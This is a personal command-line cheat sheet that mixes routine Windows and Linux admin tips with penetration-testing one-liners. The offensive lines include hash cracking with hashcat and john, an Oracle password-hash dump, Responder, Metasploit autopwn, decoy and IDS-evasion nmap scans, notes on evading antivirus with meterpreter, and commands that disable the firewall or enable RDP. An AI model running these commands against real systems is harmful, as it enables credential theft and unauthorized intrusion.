            ps aux --sort -rss |head -n 25
            
            # crack all ILO default hashes -12min on laptop from MSF dump IPMI hashes tool
            ./hashcat-cli64.exe  --remove --outfile=batchcrack.out -m 7300  hashes.txt -a 3 ?d?d?d?d?d?d?d?d
            
            
            # hashcat .. IPMI syntax
            hashcat-cli64.exe -a 3 -m 7300 --pw-min=1 --pw-max=6 -p : -o "C:\backup\hashcat-0.47\HashcatGUI_043\hashes_found.txt" --outfile-format=3 -n 4 -c 64 "hashes.txt" -1 ?l?d ?1?1?1?1?1?1
            

copy 5k random files into current directory to home path great for filling up MP3 Player with random music
-------------------

            find . -type f |shuf |head -n 5000 |xargs -d$'\n' -I{} cp -v {} ~/
            
            # crack shadow passwords ( all types )
            john --fo=bf -w:/backup/LAPTOP/backup/wordlist/rockyou.txt  bcrypt.txt
            john -show bcrypt.txt
            
            

find examples to find multiple
-------------------

            find . -iname "screen*" -o -iname "*.log" -o -iname "*.txt" -exec grep -H '[+]'  '{}' \;
            
            
            mac address
            C0:FF:EE:C0:FF:EE
            DE:AD:BE:EF:CA:FE 
            DE:FE:CA:7E:B0:0B
            

log watch 
-------------------

            tail -f `lsof | grep -ia log$ | awk '{print $9}' | sort |uniq`
            

Virtualbox mount  stuff FVWM2 stuff 
-------------------

            mount -t vboxsf delete /s
            nm-applet ( may need to apt-get remove --purge "network-manager" -y;apt-get autoremove -y ; rm -Rf /etc/NetworkManager )
            
            
            
            # xss
            http://singularityx.wordpress.com/2013/01/11/stealing-passwords-with-autocomplete-and-xss/
            
            # radar
            http://cybermap.kaspersky.com/
            
            http://www.securitywizardry.com/radar.htm
            
            
            # flows using graphviz as rendering engine. It works like this:
            
            * for %i in (*.pcap) tshark -r %i -q -z conv,tcp   >> flows.txt
            * parseflows.py -i flows.txt -o pretty.pdf
            
            
            # shh VPN netblocks non routableish ..
            25.0.0.0/8
            14.0.0.0/8 
            5.0.0.0/8
            
            
            #malware sanbox
            sanboxie BSA
            https://malwr.com/  Malwr - Malware Analysis by Cuckoo Sandbox
            https://anubis.iseclab.org Anubis Malware Analysis for Unknown Binaries
            http://http://apac.pandasecurity.com/autovin-assistant  Autovin-assistant - Panda Security Asia Pacific 
            http://bitblaze.cs.berkeley.edu/ BitBlaze: Binary Analysis for Computer Security
            http://www.joesecurity.org/joe-sandbox-desktop Agile Malware Analysis - Joe Sandbox Desktop
            http://malbox.xjtu.edu.cn/ Malbox is a service for malware analysis
            http://www.threatexpert.com/submit.aspx ThreatExpert - Submit Your Sample Online
            https://vicheck.ca/ ViCheck.ca - Find embedded malware in documents, PDFs
            http://www.xandora.net/upload/ Xandora - Your Online Binary Analyser  
            
            
            
            Excel Hell
            
            Join cells with commas   =CONCATENATE(N8,",",O8,",",P8,",",Q8,",",R8)
            remove trailing commas = SUBSTITUTE(TRIM(SUBSTITUTE(U5, ",", " "))," ", ",")
            remove trailing commas ... with commas in them.. I know right : =LEFT(U2,LEN(U2)-(LEN(U2)-SEARCH(",,",U2)+1))
            

lookup in exchange outlook api 
-------------------

            Public Function GetOffice1(var1)
            
             Dim outApp As Object 'Application
               Dim outTI As Object 'TaskItem
               Dim outRec As Object 'Recipient
               Dim outAL As Object 'AddressList
            
            
                Set outApp = GetObject(, "Outlook.Application")
                Set outAL = outApp.Session.addressLists.Item("Global Address List")
                Set outTI = outApp.CreateItem(3)
                
                outTI.Assign
                
                Set outRec = outTI.Recipients.Add(var1)
                outRec.Resolve
                If outRec.Resolved Then
                    'MsgBox outRec.addressEntry.Name
                GetOffice1 = outRec.addressEntry.GetExchangeUser.OfficeLocation
                    'MsgBox outRec.addressEntry.GetExchangeUser.JobTitle
                    'MsgBox outRec.addressEntry.GetExchangeUser.
                    'MsgBox outAL.addressEntries(outRec.addressEntry.manager.Name).GetExchangeUser.Alias
                Else
                    GetOffice1 = "Couldn't find Employee"
                End If
                
                
            End Function
            
            
            
            # Private IP space used by at least tmobile ?
            100.64.0.0 - 100.127.255.255
            25.0.0.0/8
            

CallRecorder Android
-------------------

            Device: Samsung Galaxy S4 ( T-Mobile ) 
            Recording Method
            Standard API
            
            
            #Android Hardware keys kill app killall
            Back Key (long press) Kill App
            
            # kill the god awful touchpad ...after disabling it via the systray settings...on startup...
            cax.exe /RUH "C:\Program Files\Synaptics\SynTP\SynTPEnh.exe"
            cax.exe /WAIT:10
            cat.exe /KILLALL syntp*
            
            
            
            # WMP not in services list ... ok disable windows media player via cmd
            sc config "WMPNetworkSvc" start= disabled
            
            #topports 2000 not 80ish for armitage 
            db_nmap -vvv -sV  -T4 -p 1,3-4,6-7,9,13,17,19-27,30,32-33,37,42-43,49,53,55,57,59,70,77,79,83-90,98-100,102,106,109-111,113,119,123,125,127,135,139,143-144,146,157,161,163,179,199,210-212,220,222-223,225,250-252,254-257,259,264,280,301,306,311,333,340,366,388-389,406-407,411,416-417,419,425,427,441,444-445,447,458,464-465,475,481,497,500,502,512-515,523-524,540-541,543-545,548,554-557,563,587,593,600,602,606,610,616-617,621,623,625,631,636,639,641,646,648,655,657,659-660,666-669,674,683-684,687,690-691,700-701,705,709-711,713-715,720,722,725-726,728-732,740,748-749,754,757-758,765,777-778,780,782-783,786-787,790,792,795,800-803,805-806,808,822-823,825,829,839-840,843,846,856,859,862,864,873-874,878,880,888,898,900-905,911-913,918,921-922,924,928,930-931,943,953,969,971,980-981,987,990,992-993,995-996,998-1002,1004-1015,1020-1114,1116-1119,1121-1128,1130-1132,1134-1138,1141,1143-1145,1147-1154,1156-1159,1162-1169,1173-1176,1179-1180,1182-1188,1190-1192,1194-1196,1198-1201,1204,1207-1213,1215-1218,1220-1223,1228-1229,1233-1234,1236,1239-1241,1243-1244,1247-1251,1259,1261-1262,1264,1268,1270-1272,1276-1277,1279,1282,1287,1290-1291,1296-1297,1299-1303,1305-1311,1314-1319,1321-1322,1324,1327-1328,1330-1331,1334,1336-1337,1339-1340,1347,1350-1353,1357,1413-1414,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1516,1521-1522,1524-1526,1533,1547,1550,1556,1558-1560,1565-1566,1569,1580,1583-1584,1592,1594,1598,1600,1605,1607,1615,1620,1622,1632,1635,1638,1641,1645,1658,1666,1677,1683,1687-1688,1691,1694,1699-1701,1703,1707-1709,1711-1713,1715,1717-1723,1730,1735-1736,1745,1750,1752-1753,1755,1761,1782-1783,1791-1792,1799-1801,1805-1808,1811-1812,1823,1825,1835,1839-1840,1858,1861-1864,1871,1875,1900-1901,1911-1912,1914,1918,1924,1927,1935,1947,1954,1958,1971-1976,1981,1984,1998-2013,2020-2022,2025,2030-2031,2033-2035,2038,2040-2049,2062,2065,2067-2070,2080-2083,2086-2087,2095-2096,2099-2101,2103-2107,2111-2112,2115,2119,2121,2124,2126,2134-2135,2142,2144,2148,2150,2160-2161,2170,2179,2187,2190-2191,2196-2197,2200-2201,2203,2222,2224,2232,2241,2250-2251,2253,2260-2262,2265,2269-2271,2280,2288,2291-2292,2300-2302,2304,2312-2313,2323,2325-2326,2330,2335,2340,2366,2371-2372,2381-2383,2391,2393-2394,2399,2401,2418,2425,2433,2435-2436,2438-2439,2449,2456,2463,2472,2492,2500-2501,2505,2522,2525,2531-2532,2550-2551,2557-2558,2567,2580,2583-2584,2598,2600-2602,2604-2608,2622-2623,2628,2631,2638,2644,2691,2700-2702,2706,2710-2712,2717-2718,2723,2725,2728,2734,2800,2804,2806,2809,2811-2812,2847,2850,2869,2875,2882,2888-2889,2898,2901-2903,2908-2910,2920,2930,2957-2958,2967-2968,2973,2984,2987-2988,2991,2997-2998,3000-3003,3005-3007,3011,3013-3014,3017,3023,3025,3030-3031,3050,3052,3057,3062-3063,3071,3077,3080,3089,3102-3103,3118-3119,3121,3128,3146,3162,3167-3168,3190,3200,3210-3211,3220-3221,3240,3260-3261,3263,3268-3269,3280-3281,3283,3291,3299-3301,3304,3306-3307,3310-3311,3319,3322-3325,3333-3334,3351,3362-3363,3365,3367-3372,3374,3376,3388-3390,3396,3399-3400,3404,3410,3414-3415,3419,3425,3430,3439,3443,3456,3476,3479,3483,3485-3486,3493,3497,3503,3505-3506,3511,3513-3515,3517,3519-3520,3526-3527,3530,3532,3546,3551,3577,3580,3586,3599-3600,3602-3603,3621-3622,3632,3636-3637,3652-3653,3656,3658-3659,3663,3669-3670,3672,3680-3681,3683-3684,3689-3690,3697,3700,3703,3712,3728,3731,3737,3742,3749,3765-3766,3784,3787-3788,3790,3792-3793,3795-3796,3798-3801,3803,3806,3808-3814,3817,3820,3823-3828,3830-3831,3837,3839,3842,3846-3853,3856,3859-3860,3863,3868-3872,3876,3878-3880,3882,3888-3890,3897,3899,3901-3902,3904-3909,3911,3913-3916,3918-3920,3922-3923,3928-3931,3935-3937,3940-3941,3943-3946,3948-3949,3952,3956-3957,3961-3964,3967-3969,3971-3972,3975,3979-3983,3986,3989-4007,4009-4010,4016,4020,4022,4024-4025,4029,4035-4036,4039-4040,4045,4056,4058,4065,4080,4087,4090,4096,4100-4101,4111-4113,4118-4121,4125-4126,4129,4135,4141,4143,4147,4158,4161,4164,4174,4190,4192,4200,4206,4220,4224,4234,4242,4252,4262,4279,4294,4297-4298,4300,4302,4321,4325,4328,4333,4342-4343,4355-4358,4369,4374-4376,4384,4388,4401,4407,4414-4415,4418,4430,4433,4442-4447,4449,4454,4464,4471,4476,4516-4517,4530,4534,4545,4550,4555,4558-4559,4567,4570,4599-4602,4606,4609,4644,4649,4658,4662,4665,4687,4689,4700,4712,4745,4760,4767,4770-4771,4778,4793,4800,4819,4848,4859-4860,4875-4877,4881,4899-4900,4903,4912,4931,4949,4998-5005,5009-5017,5020-5021,5023,5030,5033,5040,5050-5055,5060-5061,5063,5066,5070,5074,5080-5081,5087-5088,5090,5095-5096,5098,5100-5102,5111,5114,5120-5122,5125,5133,5137,5147,5151-5152,5190,5200-5202,5212,5214,5219,5221-5223,5225-5226,5233-5235,5242,5250,5252,5259,5261,5269,5279-5280,5291,5298,5339,5347,5353,5357,5370,5377,5405,5414,5423,5431-5433,5440-5442,5444,5457-5458,5473,5475,5500-5502,5510,5520,5544,5550,5552-5555,5557,5560,5566,5580,5631,5633,5666,5678-5680,5718,5730,5800-5803,5807,5810-5812,5815,5818,5822-5823,5825,5850,5859,5862,5868-5869,5877,5899-5907,5909-5911,5914-5915,5918,5922,5925,5938,5940,5950,5952,5959-5963,5968,5981,5987-5989,5998-6009,6017,6025,6050-6051,6059-6060,6068,6100-6101,6103,6106,6112,6123,6129,6156,6203,6222,6247,6346,6389,6481,6500,6502,6504,6510,6520,6543,6547,6550,6565-6567,6580,6600,6646,6662,6666-6670,6689,6692,6699,6711,6732,6779,6788-6789,6792,6839,6881,6896,6901,6969,7000-7004,7007,7010,7019,7024-7025,7050-7051,7070,7080,7100,7103,7106,7123,7200-7201,7241,7272,7278,7281,7402,7435,7438,7443,7496,7512,7625,7627,7676,7725,7741,7744,7749,7770,7777-7778,7800,7878,7900,7911,7913,7920-7921,7929,7937-7938,7999-8002,8007-8011,8015-8016,8019,8021-8022,8031,8042,8045,8050,8083-8090,8093,8095,8097-8100,8118,8180-8181,8189,8192-8194,8200,8222,8254,8290-8294,8300,8333,8383,8385,8400,8402,8443,8481,8500,8540,8600,8648-8649,8651-8652,8654,8675-8676,8686,8701,8765-8766,8800,8873,8877,8888-8889,8899,8987,8994,8996,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9098-9103,9110-9111,9152,9191,9197-9198,9200,9207,9220,9290,9409,9415,9418,9443-9444,9485,9500-9503,9535,9575,9593-9595,9600,9618,9621,9643,9666,9673,9815,9876-9878,9898,9900,9914,9917,9941,9943-9944,9968,9988,9992,9998-10005,10008-10012,10022-10025,10034,10058,10082-10083,10160,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,10873,11110-11111,11967,12000,12006,12021,12059,12174,12215,12262,12265,12345-12346,12380,12452,13456,13722,13724,13782-13783,14000,14238,14441-14442,15000-15004,15402,15660,15742,16000-16001,16012,16016,16018,16080,16113,16705,16800,16851,16992-16993,17595,17877,17988,18000,18018,18040,18101,18264,18988,19101,19283,19315,19350,19780,19801,19842,19900,20000,20002,20005,20031,20221-20222,20828,21571,21792,22222,22939,23052,23502,23796,24444,24800,25734-25735,26000,26214,26470,27000,27352-27353,27355-27357,27715,28201,28211,29672,29831,30000,30005,30704,30718,30951,31038,31337,31727,32768-32785,32791-32792,32803,32816,32822,32835,33354,33453,33554,33899,34571-34573,35500,35513,37839,38037,38185,38188,38292,39136,39376,39659,40000,40193,40811,40911,41064,41511,41523,42510,44176,44334,44442-44443,44501,44709,45100,46200,46996,47544,48080,49152-49161,49163-49165,49167-49168,49171,49175-49176,49186,49195,49236,49400-49401,49999-50003,50006,50050,50300,50389,50500,50636,50800,51103,51191,51413,51493,52660,52673,52710,52735,52822,52847-52851,52853,52869,53211,53313-53314,53535,54045,54328,55020,55055-55056,55555,55576,55600,56737-56738,57294,57665,57797,58001-58002,58080,58630,58632,58838,59110,59200-59202,60020,60123,60146,60443,60642,61532,61613,61900,62078,63331,64623,64680,65000,65129,65310,65389
            

openvas greenbone cmd line scan
-------------------

            omp -h 127.0.0.1 -p 9390 -u admin -w password -X "<create_target><name>$RANDOM</name><hosts>"
            `for i in `seq 1 255` ;do echo 192.168.1.$i",";done |  tr -d '\n'`
            "</hosts></create_target>"
            

ubuntu Install security updates only
-------------------

            
            apt-get -s dist-upgrade | grep "^Inst" | grep -i securi | awk -F " " {'print $2'} | xargs apt-get install
            
            

remove crap in ubuntu
-------------------

            apt-get remove deja-dup -y
            for i in `apt-cache search ubuntuone|awk '{print $1}'`;do apt-get remove $i -y ;done
            apt-get remove rhythmbox-plugin-zeitgeist geoclue geoclue-ubuntu-geoip geoip-database whoopsie -y
            echo exit 0 >  /etc/default/ntpdate
            apt-get --yes purge unity-asset-pool unity-lens-* unity-scope-*
            cd /etc/xdg/autostart/
            sed --in-place 's/NoDisplay=true/NoDisplay=false/g' *.desktop
            apt-get remove update-manager  update-notifier -y
            for i in `apt-cache search musicstore|awk '{print $1}'`;do apt-get remove $i -y ;done
            for i in `apt-cache search empathy|awk '{print $1}'` ;do apt-get remove $i -y;done
            apt-get remove -y indicator-messages
            killall indicator-messages-service
            killall unity-panel-service
            
            

install ipad apps ipa from command line 
-------------------


find all  the IPA files and extract them
-------------------

            find . -name "*.ipa" -exec unzip -o '{}'  \;

set the parms to the extracted zips
-------------------

            chmod -R 777 ./Payload
            # move the apps to the /Applicatoins folder
            mv ./Payload/* /Applicatoins/
            
            
            
            #bash web dump links lynx 
            lynx -width=999 -source -nolist URL
            
            #winrar windows mass extract
            for /f "delims=" %%i IN ('dir/s/b *.rar') do (
            C:\usb\media\WinRAR\WinRAR.exe x "%%i" "%CD%"
            )
            
            
            #recon
            pushpin 
            threatagent
            jigsaw.rb
            https://scans.io/
            
            
            #record
            tcpdump -w dump.pcap -i eth0 
            
            # rewrite
            tcprewrite --infile=dump.pcap --outfile=temp1.pcap --dstipmap=0.0.0.0/0:192.168.1.20 --enet-dmac=E0:DB:55:CC:13:F1 
            tcprewrite --infile=temp1.pcap --outfile=temp2.pcap --srcipmap=0.0.0.0/0:192.168.1.10 --enet-smac=84:A5:C8:BB:58:1A 
            tcprewrite --infile=temp2.pcap --outfile=final.pcap --fixcsum 
            sudo tcpreplay --intf1=eth0 final.pcap 
            

playback 100x fulls speed
-------------------

            tcpreplay .t --loop=100 --intf1=eth0 final.pcap
            
            
            #sharepoint hackin'
            sparty
            horse
            SPScan
            

exchange 2007
-------------------

            setup.com /PrepareSchema
            Setup.com /PrepareAD
            
            setup.com /PrepareLegacyExchangePermissions
            setup.com /PrepareSchema
            setup.com /PrepareAD
            setup.com /PrepareAllDomains
            

auto login
-------------------

            
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultUserName" /d "Administrator" /f  
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultPassword" /d "OMGYERPASSWORD" /f  
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AdminAutoLogin" /d "1" /f  
            
            

block youtube annotatoins
-------------------

            This is for anyone who runs adblock plus in firefox (should work in chrome as well) and wants to disable the annoying annotations / popups on youtube. If you have adblock installed just do the following:
            
            Firefox>tools>adblock plus>filter preferences
            
            Click add filter group, name the filter whatever you like and then in filter actions click paste after you have copied the text below.
            
            Quote:
            ||youtube.com/annotations_ 
            
            # responder
            Responder.py -bwrd --lm -i IP
            
            

oracle oclhashcat table dump
-------------------

            SELECT password,spare4,name FROM sys.user$ WHERE password is not null;
            
            # MSF UAC 
            In our experience, we can get a shell even with SEP NTP enabled. We used bind_tcp instead of reverse_tcp after lots of testing. It looks like SEP only recognized reverse meterpreter but not the bind_tcp. Here are the steps we did:
            1.      Fragmented all our traffic (fragrouter)
            2.      Set MTU to 24
            I don.t know if the above has any effect at all. We haven.t looked into it.
            On metasploit
            1.      We set the TCP_MAX_SENDSIZE to 3 or 4
            2.      Used meterpreter bind_tcp.
            I hope this will be of some help.
            
            https://github.com/mattifestation/PowerSploit
            
            
            http://hak5.org/category/episodes/metasploit-minute
            
            

autopwn with new MSF bin
-------------------


download autopwn
-------------------

            cd /opt/metasploit/apps/pro/msf3/plugins/
            wget 'https://raw.github.com/neinwechter/metasploit-framework/autopwn-modules/plugins/db_autopwn.rb'
            

get postgres password
-------------------

            cat /opt/metasploit/apps/pro/msf3/config/database.yml
            

remove plugin 
-------------------

            find /opt -iname "*trans2open*" -exec rm '{}' \;
            
            
            # start MSF
            load db_autopwn
            

clear the DB
-------------------

            # pg_hba.conf local   all         all trust restart postgres
            psql msf3 -U msf3
            DELETE FROM hosts;
            DELETE FROM services;
            DELETE FROM events;
            DELETE FROM notes;
            DELETE FROM creds;
            DELETE FROM loots;
            DELETE FROM sessions;
            DELETE FROM clients;
            \q
            
            # gogo
            db_nmap -p 445 10.0.2.2
            db_autopwn -p -t -e  -v
            
            
            
            
            # IDS Evasion for NFS, example of different options
            
            nmap --spoof-mac Apple --traceroute -T1 --data-length 9 -f -D 192.168.1.2,ME,RND:5 -v -n -O -sV -oA ~/scan.txt --log-errors -p T:111,1110,2049,4045,U:111,1110,2049,4045 --randomize-hosts 192.168.1.1-10
            
            nmap -Dmicrosoft.com,github.com,fbi.gov,google.com -sS -sV -T3 -f -mtu=24 -data-length=1227 74.125.225.142 -p 80,22
            

nmap xml 2 html
-------------------

            sltproc scan.xml -o "`date +%m%d%y`_report.html"
            

peg GPU OCLHASHCAT
-------------------

            --attack-mode 3 --gpu-accel 160 --gpu-loops 1024  --runtime 9000 --force --custom-charset1 ?l?d?s?u  --hash-type  131 0x0100aaaaaaaa0000000000000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            
            # dhcp
            netsh interface ipv4 set address name="LAN" dhcp
            netsh interface ipv4 set dnsservers name="LAN" source=dhcp
            
            # STATIC IP
            
            c:\windows\System32\ipconfig.exe /release
            
            netsh interface ipv4 set address name="LAN" source=static address=172.16.2.XXX mask=255.255.252.0 gateway=172.16.1.1
            
            netsh interface ipv4 add dnsserver name="LAN" address=172.16.2.253 index=1
            netsh interface ipv4 add dnsserver name="LAN" address=198.6.1.2 index=2
            
            Spiderlabs Responder
            python Responder.py -i 10.0.0.10 -b 1 -r 1 -w On --lm=1
            
            

metagoofil checkout 
-------------------

            checkout http://metagoofil.googlecode.com/svn/trunk/ metagoofil-read-only
            
            

dump script
-------------------

            python metagoofil.py  -d $1 -t xlsx -l 500 -n 500  -o $1files -f xlsx_results.html
            python metagoofil.py  -d $1 -t docx -l 500 -n 500 -o $1files -f docx_results.html
            python metagoofil.py  -d $1 -t pptx -l 500 -n 500 -o $1files -f pptx_results.html
            
            python metagoofil.py  -d $1 -t xls -l 500 -n 500 -o $1files -f xls_results.html
            python metagoofil.py  -d $1 -t doc -l 500 -n 500 -o $1files -f doc_results.html
            python metagoofil.py  -d $1 -t ppt -l 500 -n 500 -o $1files -f ppt_results.html
            
            python metagoofil.py  -d $1 -t pdf -l 500 -n 500 -o $1files -f pdf_results.html
            
            
            
            #  fix stupid trim file names ...
            rename 's/^(.{32}).*(\..*)$/$1$2/' *
            
            
            
            nmap compile 
            ./configure --without-zenmap --without-ncat --with-libpcap=included
            
            nmap ping scan
            nmap --script broadcast-ping -oA ping_all -n -sP 
            
            How to increase mouse sensitivity beyond limits in Windows Regedit
            reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /d "2" /f  
            reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /d "0" /f 
            reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /d "0" /f  
            taskkill /im explorer.exe /f 
            explorer 
            
            07/03/2013 - How can I prevent Ask.com Toolbar from being installed every time Java is updated
            Reg Add "HKLM\SOFTWARE\JavaSoft" /V "SPONSORS" /D DISABLE /T reg_sz /F
            Reg Add "HKLM\SOFTWARE\Wow6432Node\JavaSoft" /V "SPONSORS" /D DISABLE /T reg_sz /F
            
            
            
            
            
            06/30/2013 - Disable Skydrive/Upload Center in Office 2013
            Taskkill /F /IM MSOSYNC.EXE 
            Taskkill /F /IM MSOUC.EXE
            
            Reg Add "HKCU\software\policies\microsoft\office\common\webintegration" /V "webintegrationenabled" /D 0 /T REG_DWORD /F
            Reg Add "HKLM\software\policies\microsoft\office\common\webintegration" /V "webintegrationenabled" /D 0 /T REG_DWORD /F
            Reg Add "HKCU\Software\Microsoft\Office\15.0\Common\SignIn" /V "SignInOptions" /D 3 /T REG_DWORD /F
            Reg Add "HKLM\Software\Microsoft\Office\15.0\Common\SignIn" /V "SignInOptions" /D 3 /T REG_DWORD /F
            del /s/q c:\MSOUC.EXE
            del /s/q c:\MSOSYNC.EXE 
            

BS buttons
-------------------

            http://instantrimshot.com/classic/?sound=coughbullshit
            
            Penetration Testing Frameworks:
            
            1. iOS 
            	Tools:- iNalyzer (cydia), isafePlay, Burp for manipulating iOS apps. 
            	And follow the traditional assessment (https://www.owasp.org/index.php/IOS_Application_Security_Testing_Cheat_Sheet)
            2. Android
            	SmartPhone PenTest Framework (http://www.bulbsecurity.com/smartphone-pentest-framework/), Android SDK, OWASP LAPSE+, Burp can be used to conduct the testing. SPF can also be used to integrate with metasploit,SET etc.
            3. Windows Phone 7 and below 
            	Windows SDK (need a developer account) and Charles/Burp proxy is a good combination to conduct the assessments.
            4. BlackBerry - does provide a rigorous security screening process that submitted apps must pass in order to be listed in the store, but still we can still use the traditional android framework to test the apps designed for BB ( limited to java).
            
            
            # password manager command line for windows key manager / stored usernames and passwords windows 7 
            rundll32.exe keymgr.dll,KRShowKeyMgr
            control keymgr.dll
            

chown xcalcs calcs 
-------------------

            FOR /F "delims==" %%A IN ('dir /b') DO cacls.exe "%%A" /T /E /G everyone:f 
            find . -maxdepth 3 -exec cacls.exe '{}' /T /E /G everyone:f  \;
            
            # windows compatibility mode compat command line.
            set __COMPAT_LAYER=WinXPSP3
            

fix windows boot loader
-------------------

            ms-sys --mbr /dev/sdx
            # or
            apt-get install syslinux
            dd if=/usr/lib/syslinux/mbr.bin of=/dev/sdx
            # or
            apt-get install mbr
            install-mbr -i n -p D -t 0 /dev/sdx
            

enable fix firewall
-------------------

            netsh firewall set opmode ENABLE
            netsh advfirewall set currentprofile state on
            
            
            
            #disable windows firewall windows 7
            netsh advfirewall set AllProfiles state off 
            
            net stop MpsSvc
            
            sc config mpssvc start= Disabled
            
            
            #enable RDP over CLI
            reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
            
            # RDP timeout !!!
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\Console" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\Console" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\Console" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\Console" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\Console" /v MaxDisconnectionTime  /t REG_DWORD /d "3600000" /f
            reg add  "HKLM\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\Console" /v MaxIdleTime /t REG_DWORD /d "10800000" /f
            
            
            
            

kill RDP logins and force logoff sessionts
-------------------

            qwinsta
            rwinsta 

logoff sessions
-------------------

            logoff 1
            
            

psexec winexe
-------------------

             winexe --user admin --password=password  //192.168.1.250 c:\\windows\\system32\\nnplus.bat
            

java tricks
-------------------

            javascript:document.body.contentEditable='true'; document.designMode='on'; void 0
            javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24; x4=300; y4=200; x5=300; y5=200; DI=document.getElementsByTagName("img"); DIL=DI.length; function A(){for(i=0; i-DIL; i++){DIS=DI[ i ].style; DIS.position='absolute'; DIS.left=(Math.sin(R*x1+i*x2+x3)*x4+x5)+"px"; DIS.top=(Math.cos(R*y1+i*y2+y3)*y4+y5)+"px"}R++}setInterval('A()',5); void(0);
            
            
            

open with in ubuntu
-------------------

            # gedit ~/.gnome2/nautilus-scripts/Open\ with\ gedit
            filesall=."
            while [ $# -gt 0 ]
            do
            files=`echo .$1. | sed .s/ /\?/g.`
            filesall=.$files $filesall.
            shift
            done
            mplayer -vc ffvc1vdpau,ffwmvvdpau,ffh264vdpau,ffmpeg12vdpau -vo vdpau -ac hwdts,hwac3, -ao alsa:device=spdif -cache 8192 -fs -zoom -quiet   $filesall&
            
            
            #irssi 
            #/NETWORK ADD irc.freenode.net -autosendcmd "/^msg nickserv ident password;wait 2000"
            /NETWORK ADD irc.freenode.net
            /SERVER ADD -auto -network irc.freenode.net irc.freenode.net 6667
            /CHANNEL ADD -auto #infonomicon irc.freenode.net
            
            

irssi aliases in conf
-------------------

             1 = "/^msg NickServ ghost operat0r password";
              2 = "/^nick operat0r";
              3 = "/^msg NickServ identify operat0r password";
              4 = "/^msg NickServ identify password";
            m = "wait 5000;/window 2;wait 5000;/window show 2;wait 9000;/window show 3;wait 9000;/window show 4;wait 9000;/win balance;wait 5000;/clear -all";
            
            

example image dump
-------------------

            wget -q  --no-clobber -P pics -H -nd -r -Dimages.4chan.org -A '.jpg,.jpeg,.png,.gif,' -U 'rmccurdyDOTcom' -e robots=off http://boards.4chan.org/b/
            
            
            

purge security  onion 
-------------------

            nsm_sensor_clean --force-yes
            rm -rf /nsm/sensor_data/*/dailylogs/*
            sguil-db-purge
            rm -Rf /nsm/bro/spool/tmp/
            
            
            

disable ipv6 win7
-------------------

            netsh interface teredo set state disabled
            netsh interface ipv6 6to4 set state state=disabled undoonstop=disabled
            netsh interface ipv6 isatap set state state=disabled
            
            #disable firefox plugin check : in about:config add FAIL in front of plugins.update.url and rename the DLL or plugin restart FF !
            
            # exploit-db.com checkout svn checkout
            wget exploit-db.com/archive.tar.bz2
            

weather radar on liner wunderground 
-------------------

            radblast-aws.wunderground.com/cgi-bin/radar/WUNIDS_map?station=FFC&brand=wui&num=10&delay=15&type=N0R&frame=0&scale=1.000&noclutter=0&t=1361486454&lat=34.02500916&lon=-84.31282806&label=RMCCURDY.COM&showstorms=0&map.x=400&map.y=240&centerx=400&centery=240&transx=0&transy=0&showlabels=1&severe=0&rainsnow=0&lightning=0&smooth=0
            
            #powershell
